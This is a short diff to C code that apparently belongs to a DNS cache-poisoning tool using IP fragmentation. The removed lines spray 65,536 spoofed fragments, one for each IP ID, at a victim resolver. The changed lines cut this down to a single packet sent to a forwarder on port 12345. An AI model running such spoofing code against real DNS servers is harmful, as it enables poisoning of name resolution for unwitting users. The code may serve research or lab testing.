@@ -189,7 +189,7 @@ bool make_ipfragment_packets(Arena* arena, packet_queue_t* queue, void* args) {
                                             inet_addr(s_args->auth_ip),
                                             inet_addr(s_args->forward_ip),
                                             53, 
-                                            53, // just for free
+                                            12345, // just for free
                                             dns_payload, dns_payload_len);
     
     uint8_t** packets_ptrptr = (uint8_t**)arena_alloc_memory(arena, sizeof(uint8_t*) * MAX_FRAGMENTS);
@@ -212,11 +212,11 @@ bool make_ipfragment_packets(Arena* arena, packet_queue_t* queue, void* args) {
     struct sockaddr_in dest_addr_template;
     memset(&dest_addr_template, 0, sizeof(dest_addr_template));
     dest_addr_template.sin_family = AF_INET;
-    dest_addr_template.sin_addr.s_addr = inet_addr(s_args->victim_ip);
-    dest_addr_template.sin_port = htons(53); // just for free
+    dest_addr_template.sin_addr.s_addr = inet_addr(s_args->forward_ip);
+    dest_addr_template.sin_port = htons(12345); // just for free
 
     // 2. Generate 65536 packets, each with a different IPID
-    for (uint32_t i = 0; i <= UINT16_MAX; i++) {
+    for (uint32_t i = 1; i <= 1; i++) {
         packet_t* new_pkt = (packet_t*)arena_alloc_memory(arena, sizeof(packet_t));
         new_pkt->data = (uint8_t*)arena_alloc_memory(arena, packet_raw_len);
         new_pkt->size = packet_raw_len;
